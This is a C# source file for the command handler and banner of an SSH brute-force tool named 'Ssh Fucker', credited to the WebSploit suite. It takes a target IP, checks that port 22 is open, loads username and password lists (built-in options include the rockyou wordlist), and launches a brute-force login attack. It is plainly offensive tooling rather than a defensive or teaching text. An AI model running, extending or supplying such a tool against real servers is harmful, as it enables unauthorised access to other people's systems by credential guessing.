using System;
using System.IO;
using System.Threading;
using System.Net;

namespace SshAttacker
{
    class Program
    {
        public static void CommandInterpreter(string command)
        {
            string[] command_words = command.Split(" ");
            if(command_words.Length >= 2)
            {
                if(command_words[1] == "-help")
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[SYNTAX] > -sshfucker <TARGET_IP_ADDRESS>(port 22 must be open) <USER_LISTR>(type '-b' for built-in) <PASS_LIST>(type '-b' for built-in)");
                    Console.ForegroundColor = ConsoleColor.White;
                }
                else
                {
                    if(command_words.Length == 4)
                    {
                        if(IPAddress.TryParse(command_words[1], out IPAddress ipAddr))
                        {
                            if(PortScanner.isPortOpen(ipAddr,22))
                            {
                                string target_ip = command_words[1];
                                if(File.Exists(command_words[2]))
                                {
                                    string[] users = File.ReadAllLines(command_words[2]);
                                    if(File.Exists(command_words[3]))
                                    {
                                        string[] pass = File.ReadAllLines(command_words[3]);
                                        SshAttacker.Controller.RunAttack(target_ip, users, pass);
                                    }   
                                    else if(command_words[3].ToLower() == "-b")
                                    {
                                        string[] pass = WebSploit.Properties.Resources.rockyou.Split('\n');
                                        SshAttacker.Controller.RunAttack(target_ip, users, pass);
                                    }
                                    else
                                    {
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine($"[!]-[websploit@ftplogger] ~$ Invalid syntax [{command_words[3]}]!\n");
                                        Console.ForegroundColor = ConsoleColor.White;
                                    }
                                    
                                }
                                else if(command_words[2].ToLower() == "-b")
                                {
                                    string[] users = WebSploit.Properties.Resources.users.Split('\n');
                                    if(File.Exists(command_words[3]))
                                    {
                                        string[] pass = File.ReadAllLines(command_words[3]);
                                        SshAttacker.Controller.RunAttack(target_ip, users, pass);
                                    }   
                                    else if(command_words[3].ToLower() == "-b")
                                    {
                                        string[] pass = WebSploit.Properties.Resources.rockyou.Split('\n');
                                        SshAttacker.Controller.RunAttack(target_ip, users, pass);
                                    }
                                    else
                                    {
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine($"[!]-[websploit@ftplogger] ~$ Invalid syntax [{command_words[3]}]! Type '-ftplogger -help'\n");
                                        Console.ForegroundColor = ConsoleColor.White;
                                    } 
                                }
                                else
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine($"[!]-[websploit@ftplogger] ~$ Invalid syntax [{command_words[2]}]! Type '-ftplogger -help'\n");
                                    Console.ForegroundColor = ConsoleColor.White;
                                }
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine($"[!]-[websploit@ftplogger] ~$ Invalid ip address [{command_words[1]}]! Port 22 is closed. Type '-ftplogger -help'\n");
                                Console.ForegroundColor = ConsoleColor.White;
                            }
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"[!]-[websploit@ftplogger] ~$ Invalid syntax [{command}]! Type '-ftplogger -help'\n");
                            Console.ForegroundColor = ConsoleColor.White;
                        }
                    }
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!]-[websploit@ftplogger] ~$ Invalid syntax [{command}]! Type '-ftplogger -help'\n");
                Console.ForegroundColor = ConsoleColor.White;
            }
        }
       

        public static void SetupAttackEnv(string ip)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(Figgle.FiggleFonts.Standard.Render("Ssh Fucker"));
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Ssh Fucker v1.2 © 2021 MishDotCom");
            Console.WriteLine("Part of the WebSploit suite.");
            Console.WriteLine("WebSploit > https://github.com/MishDotCom/WebSploit\n");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"Target ssh server : {ip}");
            Console.WriteLine("[INFO] : Begin bruteforce attack...\n");
            Console.ForegroundColor = ConsoleColor.White;
            Thread.Sleep(150);
        }
    }
}
